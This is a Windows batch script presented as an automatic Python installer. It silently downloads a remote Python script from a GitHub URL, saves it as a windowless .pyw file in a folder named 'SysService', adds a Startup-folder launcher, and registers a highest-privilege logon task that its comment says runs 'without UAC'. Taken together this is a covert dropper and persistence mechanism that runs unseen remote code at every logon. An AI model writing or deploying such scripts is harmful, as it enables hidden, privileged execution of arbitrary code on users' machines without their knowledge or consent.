@echo off
setlocal EnableDelayedExpansion
color 0A
title Auto Python Installer + Startup Setup

:: === [1] Check if Python is installed ===
where python >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Python not found. Installing 3.11...
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe' -OutFile python-installer.exe"
    start /wait python-installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    del python-installer.exe
    echo [✓] Python 3.11 installed
) else (
    echo [✓] Python already installed
)

:: === [2] Create SysService folder ===
set SYSFOLDER=%APPDATA%\SysService
if not exist "%SYSFOLDER%" (
    mkdir "%SYSFOLDER%"
    echo [✓] Created SysService folder at: %SYSFOLDER%
)

:: === [3] Download Python script from GitHub ===
echo [>] Downloading Python script...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mabdullahprogrammer/files/refs/heads/main/server.py' -OutFile '%SYSFOLDER%\server.pyw'"
if exist "%SYSFOLDER%\server.pyw" (
    echo [✓] Python script saved
) else (
    echo [X] Failed to download server.py
    pause
    exit /b
)

:: === [4] Create BAT launcher in Startup folder ===
set STARTUPBAT=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\run_script.bat

(
    echo @echo off
    echo cd /d "%%~dp0"
    echo pythonw %SYSFOLDER%\server.pyw
) > "%STARTUPBAT%"

echo [✓] BAT launcher created in Startup folder

:: === [5] Create admin task to run without UAC ===
set TASKNAME=SysServiceTask
schtasks /Query /TN "%TASKNAME%" >nul 2>&1
if %errorlevel% equ 0 (
    schtasks /Delete /TN "%TASKNAME%" /F >nul
)

:: Use full path to Python
for /f "tokens=*" %%i in ('where python') do set PYTHON=%%i

schtasks /Create /SC ONLOGON /RL HIGHEST /TN "%TASKNAME%" /TR "\"%PYTHON%\" \"%SYSFOLDER%\server.py\"" >nul 2>&1

if %errorlevel% equ 0 (
    echo [✓] Task Scheduler setup for no-UAC startup
) else (
    echo [X] Failed to create scheduled task (try running this installer as admin)
)

:: === Done ===
echo.
echo [✓] All Done! Script will now run silently at logon.
pause
